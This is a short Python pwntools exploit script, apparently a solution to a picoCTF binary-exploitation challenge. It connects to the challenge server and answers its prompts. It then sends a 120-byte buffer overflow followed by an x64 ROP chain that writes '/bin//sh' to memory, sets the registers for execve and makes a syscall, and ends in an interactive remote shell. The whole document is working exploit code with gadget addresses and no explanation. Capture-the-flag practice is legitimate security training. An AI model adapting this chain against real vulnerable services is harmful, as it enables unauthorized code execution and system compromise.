from pwn import *

from socket import *
from struct import *

#ROP x64

#0x6bc3a0: empty address
#0x4163f4: pop rax ; ret
#0x44a6b5: pop rdx ; ret
#0x410ca3: pop rsi ; ret
#0x400696: pop rdi ; ret
#0x47ff91: mov qword ptr [rsi] , rax ; ret
#0x40137c: syscal;

#elf = ELF('./vuln')
#p= elf.process()
p=remote('jupiter.challenges.picoctf.org', 39940)
p.recvuntil('?')
p.sendline('84')

p.recvuntil('?')

buf=b'\x41'*120
#Write
buf+=pack("<Q", 0x4163f4)
buf+=b'/bin//sh'
buf+=pack("<Q", 0x410ca3)
buf+=pack("<Q", 0x6bc3a0)
buf+=pack("<Q", 0x47ff91)

#Execute
buf+=pack("<Q", 0x400696)
buf+=pack("<Q", 0x6bc3a0) #Write address of string to rdi
buf+=pack("<Q", 0x4163f4)
buf+=pack("<Q", 0x3b)     #Set rax to 59 (execve)
buf+=pack("<Q", 0x44a6b5)
buf+=pack("<Q", 0x0)
buf+=pack("<Q", 0x410ca3)
buf+=pack("<Q", 0x0)
buf+=pack("<Q", 0x40137c)

p.sendline(buf)

p.interactive()


